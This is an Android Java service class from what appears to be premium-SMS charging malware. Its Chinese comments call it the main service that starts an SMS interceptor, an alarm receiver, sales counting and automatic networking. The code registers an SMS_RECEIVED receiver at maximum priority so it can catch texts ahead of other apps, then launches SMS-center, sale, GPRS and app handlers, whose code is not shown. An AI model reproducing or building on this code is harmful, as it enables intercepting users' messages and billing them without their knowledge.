package com.sttm.charge;

import com.sttm.util.KsoCache;
import com.sttm.util.LogFile;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.util.Log;




/**
 * 主服务程序
 * 
 * 1，初始化数据；2 启动短信拦截器  3 启动定时广播接收器  4 开始统计销量或者自动联网
 * 
 * @author ligm
 *
 */
public class MainService extends Service {

	private Context context;
	@Override
	public void onCreate() {
		context = this.getApplicationContext();

		super.onCreate();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);
		
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);
		SmsReceiver sr = new SmsReceiver();
		context.registerReceiver(sr, localIntentFilter);

		LogFile.WriteLogFile("启动了短信拦截器");
		Log.d("test", "启动了短信拦截器");

		IntentFilter alarmFilter = new IntentFilter(
				"com.zcl.action.ALARMRECEIRVE");
		KsoAlarmService kas = new KsoAlarmService();
		context.registerReceiver(kas, alarmFilter);
		LogFile.WriteLogFile("启动了定时广播接收器");
		Log.d("test", "启动了定时广播接收器");

		KsoMainCourse.startSmsCenterHandler(context);
		KsoCache.getInstance().reSetValue("smsCenterFlag", true);

		KsoMainCourse.startMainAlarm(context);
		KsoMainCourse.startSaleHandler(context);
		KsoMainCourse.startGPRSHandler(context);
		KsoMainCourse.startAppsHandler(context);
		Log.d("test", "启动了xxxxx");
		
		
		
	
		
		
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
